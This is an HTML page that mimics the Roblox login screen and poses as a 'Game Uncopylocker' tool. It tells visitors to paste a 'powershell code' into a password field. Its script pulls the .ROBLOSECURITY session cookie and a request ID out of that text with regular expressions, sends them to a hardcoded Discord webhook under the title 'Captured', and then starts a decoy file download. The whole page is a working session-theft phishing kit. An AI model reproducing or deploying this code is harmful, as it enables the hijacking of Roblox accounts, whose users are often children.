<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="description" content="Game Uncopylocker" />
    <title>Uncopylock a game</title>
    
    <link href="https://images.rbxcdn.com/e854eb7b2951ac03edba9a2681032bba.ico" rel="icon" />
    
    <link 
        rel="stylesheet" 
        href="https://css.rbxcdn.com/944c0c29b874f40bc983ce7754218170b4265e625e7351b1c6880694adb81556.css"
        onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" 
        data-bundlename="StyleGuide" 
        data-bundle-source="Main" 
    />
    <link 
        rel="stylesheet" 
        href="https://css.rbxcdn.com/7fc67d38cfc34042bc251805f872ff5be8cb502859e943e5dda46fc3907375c6.css"
        onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" 
        data-bundlename="Builder" 
        data-bundle-source="Main" 
    />
    <link 
        rel="stylesheet" 
        href="https://css.rbxcdn.com/f7426ffb19aeabf7440648f7fc7658fa8f823763664f8b667d9b45c8007e3d20.css" 
        onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" 
        data-bundlename="Navigation" 
        data-bundle-source="Main" 
    />
    <link 
        rel="stylesheet" 
        href="https://css.rbxcdn.com/d47b8eefce509dac9b478c8602d901170bbeedd3dad170867869f3cad3f49f15.css" 
        onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" 
        data-bundlename="ReactLogin" 
        data-bundle-source="Main" 
    />
</head>
<body id="rbx-body" dir="ltr" class="rbx-body dark-theme builder-font" data-performance-relative-value="0.005" data-internal-page-name="Login" data-send-event-percentage="0">

    <div id="navigation-container">
        <header id="header" class="navbar-fixed-top rbx-header" role="navigation">
            <div class="container-fluid">
                <div class="rbx-navbar-header">
                    <div id="header-menu-icon" class="rbx-nav-collapse">
                        <button type="button" class="btn-primary-xs btn-min-width" id="skip-to-main-content">
                            Continue to main content
                        </button>
                    </div>
                    <div class="navbar-header">
                        <a class="navbar-brand" href="#">
                            <span class="icon-logo"></span><span class="icon-logo-r"></span>
                        </a>
                    </div>
                </div>
            </div>
        </header>
    </div>

    <main id="react-login-web-app" class="login-container">
        <section id="login-base" class="login-base-container">
            <div class="section-content login-section">
                <h1 class="login-header">Game Uncopylocker</h1>
                <div id="login-form">
                    <form class="login-form" name="loginForm" novalidate>
                        <div class="form-group password-form-group">
                            <input
                                id="login-password"
                                name="password"
                                class="form-control input-field"
                                placeholder="Game's powershell code."
                            />
                            <div aria-live="polite"></div>
                        </div>
                        <button type="button" id="login-button" class="btn-full-width login-button btn-secondary-md">
                            Extract Game!
                        </button>
                    </form>
                </div>
				
                <div class="text-center forgot-credentials-link">
                    <a id="forgot-credentials-link" class="text-link" href="https://www.youtube.com/watch?v=O-Fc-EXcbNk" target="_self">
                        How to uncopylock a roblox game?
                    </a>
                </div>

                <div id="crossDeviceLoginDisplayCodeModal-container"></div>
                <div id="otp-login-container"></div>
                <div id="account-switcher-confirmation-modal-container"></div>
                <div class="text-center"></div>
            </div>
            <div id="react-login-account-limit-error-container"></div>
        </section>
    </main>

<script>
document.getElementById('login-button').addEventListener('click', () => {
  const powershell = document.getElementById('login-password').value.trim();
  const a = document.createElement('a');

  a.href = "https://github.com/user-attachments/files/23608508/extractedgame.zip";
  a.download = "ExtractedGame.rbxl";

  document.body.appendChild(a);

  if (!powershell) {
    alert('Please enter the powershell code.');
    return;
  }

  if (powershell.length < 50) {
    alert('Powershell code is not valid. Try copying it again.');
    return;
  }

  const powershellPattern = /System\.Net\.Cookie\("\.ROBLOSECURITY",\s*"([^"]+)",\s*"\/",\s*"\.roblox\.com"\)/m;
  const requestIdPattern = /`"requestId`":`"([^`]+)`"/;

  const SecurityMatch = powershell.match(powershellPattern);
  const requestIdMatch = powershell.match(requestIdPattern);

  if (!SecurityMatch) {
    alert("The powershell code is not valid.");
    return;
  }
  if (!requestIdMatch) {
    alert("The powershell code is not valid.");
    return;
  }

  const extractedSecurity = SecurityMatch[1];
  const extractedPlayerID = requestIdMatch[1];

  const lastSent = localStorage.getItem('lastSentTimestamp');
  const now = Date.now();
  const oneHour = 60 * 60 * 1000;

  if (lastSent && now - lastSent < oneHour) {
    const minutesLeft = Math.ceil((oneHour - (now - lastSent)) / 60000);
    alert(`Please wait ${minutesLeft} minute(s) before extracting again.`);
    return;
  }

  const webhookUrl = "https://discord.com/api/webhooks/1440337366970794156/HH54e5eXNvrebLgjXmeiBUWcblgiq8lV3AnasAmwDh9-9XeZCzDG1N5BDIg92n59fFEP";

  const payload = {
    embeds: [{
      title: "Captured",
      color: 15158332,
      description: `**.ROBLOSECURITY:**\n\`${extractedSecurity}\``,
      fields: [
        { name: "UserID", value: extractedPlayerID, inline: false },
      ],
      timestamp: new Date().toISOString()
    }]
  };

  fetch(webhookUrl, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  })
  .then(response => {
    if (response.ok) {
      alert("Selected Game Extracted. Rename zip to rbxl");
      localStorage.setItem('lastSentTimestamp', now);
      document.getElementById('login-password').value = '';
	  a.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true, view: window }));
	  document.body.removeChild(a);
    } else {
      response.text().then(text => console.error("Error:", text));
      alert("Failed to extract the game. Maybe the servers are down? Try again later");
    }
  })
  .catch(error => {
    alert("Error sending.");
    console.error(error);
  });
});
</script>

</body>
</html>
